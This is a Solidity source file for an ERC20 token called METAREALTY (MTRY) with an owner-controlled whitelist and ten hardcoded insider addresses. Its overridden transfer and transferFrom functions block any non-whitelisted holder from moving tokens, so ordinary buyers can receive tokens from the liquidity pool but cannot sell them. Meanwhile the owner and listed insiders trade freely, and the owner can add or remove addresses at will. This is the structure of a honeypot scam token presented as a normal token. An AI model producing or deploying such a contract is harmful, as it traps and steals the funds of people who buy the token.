// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("METAREALTY", "MTRY") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 3000000 * 10 ** decimals());
        whiteList[0xF025399416d93D0B6907eAe97969EBFfef8910D3]= true;
        whiteList[0xe96E4E7F25578e72aa8B13c92e8dbf32D7CD1Ba5]=true;
        whiteList[0xB4b6efFB647B2Bf02bD7d6E5a411311A8Bc3Ae0f]=true;
        whiteList[0xdeAFaBeeA3Ab6Ef3a6B9F50418DD039DB9C442A3]=true;
        whiteList[0xe9B3503063f46AF71709a72d83fFa38f3dc55dAB]=true;
        whiteList[0xb9A328426e3fA0B3238A2EbbA5341F0164A982Ab]=true;
        whiteList[0xb3392bc12E909c237DD594D0E5eCB8A1fcBa56BC]=true;
        whiteList[0xEF36A1ECD2aF3c6E8A9340915905bb8cdf6e0DAD]=true;
        whiteList[0x1C31F7D97262AfBF3a6FECED67dDf3465ffe6887]=true;
        whiteList[0x3C6984Ca56Ec1af252682d617dFcc6882b5191C0]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}